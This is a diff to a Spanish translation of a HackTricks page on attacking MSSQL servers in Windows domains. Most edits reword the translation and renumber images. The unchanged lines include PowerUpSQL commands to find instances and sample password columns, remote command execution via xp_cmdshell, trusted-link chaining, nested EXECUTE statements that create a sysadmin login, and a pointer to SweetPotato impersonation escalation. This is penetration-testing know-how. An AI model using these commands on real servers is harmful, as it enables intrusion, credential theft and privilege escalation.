@@ -6,7 +6,7 @@
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
@@ -16,8 +16,7 @@
 
 {% embed url="https://websec.nl/" %}
 
-
-## **Enumeración / Descubrimiento de MSSQL**
+## **Enumeración / Descubrimiento MSSQL**
 
 El módulo de PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) es muy útil en este caso.
 ```powershell
@@ -70,14 +69,14 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 ## This won't use trusted SQL links
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
-### MSSQL RCE
+### RCE de MSSQL
 
-También podría ser posible **ejecutar comandos** dentro del host MSSQL
+También podría ser posible **ejecutar comandos** dentro del host de MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### Trucos Básicos de Hacking de MSSQL
+### Trucos Básicos de Hacking en MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -137,14 +136,14 @@ Desde **Windows** también podrías encontrar los enlaces y ejecutar comandos ma
 
 _Iniciar sesión usando autenticación de Windows:_
 
-![](<../../.gitbook/assets/image (805).png>)
+![](<../../.gitbook/assets/image (808).png>)
 
 #### Encontrar Enlaces Confiables
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (713).png>)
+![](<../../.gitbook/assets/image (716).png>)
 
 #### Ejecutar consultas en enlace confiable
 
@@ -156,7 +155,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 Verifica dónde se utilizan las comillas dobles y simples, es importante usarlas de esa manera.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (640).png>)
+![](<../../.gitbook/assets/image (643).png>)
 
 Puedes continuar esta cadena de enlaces confiables para siempre de forma manual.
 ```sql
@@ -170,7 +169,7 @@ Si no puedes realizar acciones como `exec xp_cmdshell` desde `openquery()`, inte
 
 ### Manual - EXECUTE
 
-También puedes abusar de enlaces de confianza usando `EXECUTE`:
+También puedes abusar de los enlaces confiables utilizando `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -180,10 +179,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 El usuario local de **MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "suplante a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han ideado es forzar a un servicio del sistema a autenticarse en un servicio falso o de intermediario que el atacante crea. Este servicio falso puede entonces suplantar al servicio del sistema mientras intenta autenticarse.
+Una estrategia que muchos autores han ideado es forzar a un servicio del sistema a autenticarse en un servicio falso o de intermediario creado por el atacante. Este servicio falso puede entonces suplantar al servicio del sistema mientras intenta autenticarse.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que pueden ejecutarse mediante el comando `execute-assembly` de Beacon.
-
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -195,8 +193,8 @@ Una estrategia que muchos autores han ideado es forzar a un servicio del sistema
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
